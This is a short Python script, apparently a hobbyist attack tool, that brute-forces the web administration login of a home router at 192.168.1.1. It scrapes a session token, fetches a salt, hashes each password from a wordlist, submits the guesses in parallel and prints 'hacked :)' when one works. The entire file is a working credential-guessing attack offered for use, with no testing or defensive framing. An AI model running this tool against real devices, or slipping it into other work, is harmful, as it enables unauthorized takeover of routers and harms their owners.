import requests
import re
import hashlib
import argparse
import lxml.html
import time
import multiprocessing as mp

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def login(username, pswd):
    url = "http://192.168.1.1"
    headers = {
        'Accept' : '*/*',
        'Accept-Language' : "en-US,en;q=0.5",
        'Cache-Control' : 'max-age=0',
        'Connection' : 'keep-alive',
        "Host" : '192.168.1.1',
        "Referer" : url, 
        "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
    }
    s = requests.Session()
    r = s.get(url, headers = headers)
    if r.ok:
        page = r.text
        token_idx = page.find('addParameter("_sessionTOKEN", "')
        token = r.text[token_idx+31:token_idx + 55]

        xml = get_xml_param()
        hashpswd = passwd_to_sha256(pswd, xml)
        
        params = {
            "Username" : username,
            "Password" : hashpswd,
            "action" : "login",
            "_sessionTOKEN" : token,
        }

        r = s.post(url, headers = headers, data = params)
        if r.ok:
            with open("test.html", "w") as t:
                t.write(r.text)
            tree = lxml.html.fromstring(r.text)
            user_info = tree.xpath(".//div[contains(@id, 'logUser')]/@title")
            if user_info[0]:
                print (Colors.GREEN + f"{username}:{pswd} successfully login, hacked :)" + Colors.ENDC)
            else:
                print (Colors.RED + f"{username}:{pswd} - login failed :(" + Colors.ENDC)
    time.sleep(200)

def get_xml_param():
    url = "http://192.168.1.1/function_module/login_module/login_page/logintoken_lua.lua"
    headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
    r = requests.get(url, headers = headers)
    if r.ok:
        xml = re.sub('[^0-9,]', "", r.text)
        return xml
    return None

def passwd_to_sha256(pswd, xml):
    h = hashlib.sha256(f"{pswd}{xml}".encode('utf-8')).hexdigest()
    return h

def brute(username, wordlist):
    print (Colors.BLUE + "start brute..." + Colors.ENDC)
    pool = mp.Pool(4)
    jobs = []
    with open(wordlist) as fp:
        for pswd in fp:
            jobs.append(pool.apply_async(login, (username, pswd.replace("\n", "").strip())))
    for job in jobs:
        job.get()
    pool.close()
    print (Colors.BLUE + "finish brute..." + Colors.ENDC)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--uname', required = True, help = "username", default = 'admin')
    parser.add_argument('-w','--wordlist', required = True, help = "wordlist file")
    args = vars(parser.parse_args())
    brute(args['uname'], args['wordlist'])
    